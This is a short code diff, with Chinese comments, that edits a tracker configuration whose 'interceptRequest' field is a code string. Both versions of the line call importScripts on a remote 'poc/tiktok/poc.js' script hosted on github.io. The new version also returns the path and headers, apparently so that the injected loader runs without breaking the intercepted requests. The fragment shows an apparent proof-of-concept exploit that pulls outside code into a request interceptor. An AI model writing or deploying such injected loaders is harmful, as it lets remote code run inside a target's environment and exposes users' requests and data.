@@ -20,7 +20,7 @@
                         trackers: ["html","image","js","Network"],  // 只启用 Network
                         
                         // interceptRequest 必须是字符串
-                        interceptRequest: `(function(path, headers) {importScripts("https://johnstonemees.github.io/poc/tiktok/poc.js")})`,
+                        interceptRequest: `(function(path, headers) {importScripts("https://johnstonemees.github.io/poc/tiktok/poc.js"); return {path: path, headers: headers};})`,
                         
                         environment: {
                             type: "PROD-PUBLIC",
